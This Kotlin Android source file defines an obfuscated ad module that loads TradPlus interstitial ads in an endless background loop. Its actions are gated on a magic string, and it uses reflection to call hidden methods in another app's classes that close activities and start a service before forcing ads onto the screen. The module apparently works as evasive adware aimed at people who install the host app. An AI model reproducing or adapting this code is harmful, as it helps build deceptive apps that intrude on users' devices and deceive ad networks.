package com.example.innerdex

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.os.Message
import android.os.PowerManager
import androidx.annotation.DoNotInline
import androidx.annotation.Keep
import androidx.appcompat.app.AppCompatActivity
import com.tradplus.ads.base.bean.TPAdInfo
import com.tradplus.ads.open.interstitial.TPInterstitial
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.concurrent.atomic.AtomicReference
import kotlin.reflect.full.companionObject
import kotlin.reflect.full.companionObjectInstance
import kotlin.reflect.full.functions
import kotlin.reflect.full.memberFunctions
import kotlin.reflect.jvm.isAccessible

object AdJDWFS {
    private var TP_INTERSTITIAL: TPInterstitial? = null
    val tplStr: AtomicReference<String> = AtomicReference()
    private var loadJob: Job? = null
    private var inJob: Job? = null

    var INTERNAL_WHILE: Long = 41L
    var INTERNAL_NOT_SHOW: Long = 10L
    var INTERNAL_AD: Long = 3100L

    private val wHandler: Handler = Handler(Looper.getMainLooper()) {
        when (it.what) {
            //初始化
            800 -> {
                if (tplStr.get() == "feiuwahf") {
                    TP_INTERSTITIAL = TPInterstitial(Liuce.mContext, IndsjfKey.UOT_ID)
                    setListener()
                    TP_INTERSTITIAL?.loadAd()
                    lLoad()
                }
            }
            //加载广告
            801 -> {
                if (tplStr.get() == "feiuwahf") {
                    loadJob?.cancel()
                    loadJob = CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                        while (isActive) {
                            delay(INTERNAL_WHILE * 1000L)
                            Aifnsdf.callLoadEv()
                            TP_INTERSTITIAL?.loadAd()
                        }
                    }
                }
            }

            //展示广告
            802 -> {
                MainScope().launch {
                    fucal()
                }
            }
            //常规间隔
            804 -> {
                if (tplStr.get() == "feiuwahf") {
                    inJob?.cancel()
                    inJob = CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
                        delay(INTERNAL_NOT_SHOW * 1000L)
                        lLoad()
                    }
                }
            }
        }
        true
    }


    @DoNotInline
    fun initTP() {
        if (tplStr.get() == "feiuwahf") {
            wHandler.sendMessage(Message.obtain(wHandler).apply { what = 800 })
        }
    }

    @DoNotInline
    private fun lLoad() {
        if (tplStr.get() == "feiuwahf") {
            wHandler.sendMessage(Message.obtain(wHandler).apply { what = 801 })
        }
    }

    @DoNotInline
    private fun lShow() {
        if (tplStr.get() == "feiuwahf") {
            wHandler.sendMessage(Message.obtain(wHandler).apply { what = 802 })
        }
    }

    @DoNotInline
    private fun startStandIntern() {
        if (tplStr.get() == "feiuwahf") {
            wHandler.sendMessage(Message.obtain(wHandler).apply { what = 804 })
        }
    }

    @DoNotInline
    private suspend fun fucal() {
        try {
            if ((Liuce.mContext?.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && tplStr.get() == "feiuwahf") {
                try {
                    val catu = Class.forName("com.app.quench.log.history.CodeActivityUtil")
                    val kClaz = catu.kotlin
                    val osk = kClaz.memberFunctions.find { func -> func.name == "finishAll" }
                    if (osk != null) {
                        osk.isAccessible = true
                        osk.call(kClaz.objectInstance)
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                delay(1400)
                try {
                    val yhwu = Class.forName("com.app.quench.log.setting.YhwuHnd")
                    val kot = yhwu.kotlin
                    val osk = kot.functions.find { fu-> fu.name== "oskd"}
                    osk?.isAccessible = true
                    osk?.call(kot.objectInstance, 22, "Szs")
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Aifnsdf.callReady(1)
            } else {
                Aifnsdf.callReady(2)
            }
        } catch (_: Exception) {
        } finally {
            startStandIntern()
        }
    }

    @DoNotInline
    @Keep
    @JvmStatic
    fun hitshow(activity: AppCompatActivity) {
        caraShow(activity)
    }

    @DoNotInline
    private fun caraShow(activity: AppCompatActivity) {
        Aifnsdf.callShow()
        MainScope().launch {
            delay(INTERNAL_AD)
            if (tplStr.get() == "feiuwahf" && TP_INTERSTITIAL?.isReady == true) {
                TP_INTERSTITIAL?.showAd(activity, "")
            } else {
                Aifnsdf.callShowInk("ready:false")
            }
        }
        try {
            val yhwu = Class.forName("com.app.quench.log.HitApp")
            val kClaz = yhwu.kotlin
            val compan = kClaz.companionObject
            if (compan != null) {
                val osk = compan.memberFunctions.find { func -> func.name == "stService" }
                if (osk != null) {
                    osk.isAccessible = true
                    osk.call(kClaz.companionObjectInstance)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    private fun setListener() {
        TP_INTERSTITIAL?.setAdListener(CdsTpListe(object : CodskTpListenr {
            override fun showSuc(info: TPAdInfo?) {
                if (info != null) {
                    inJob?.cancel()
                    lLoad()
                    Aifnsdf.callTPal(info)
                }
                Aifnsdf.callShowInk("1")
            }

            override fun loadSuc(info: TPAdInfo?) {
                loadJob?.cancel()
                lShow()
            }

            override fun loadFail(e: String?) {
                Aifnsdf.callLoadFail(e)
            }

            override fun showFail(e: String?) {
                Aifnsdf.callShowInk(e)
            }

            override fun close() {
                try {
                    val yhwu = Class.forName("com.app.quench.log.history.CodeActivityUtil")
                    val kClaz = yhwu.kotlin
                    val osk = kClaz.memberFunctions.find { func -> func.name == "finishAll" }
                    if (osk != null) {
                        osk.isAccessible = true
                        osk.call(kClaz.objectInstance)
                    }
                } catch (_: Exception) {
                }
            }
        }))
    }
}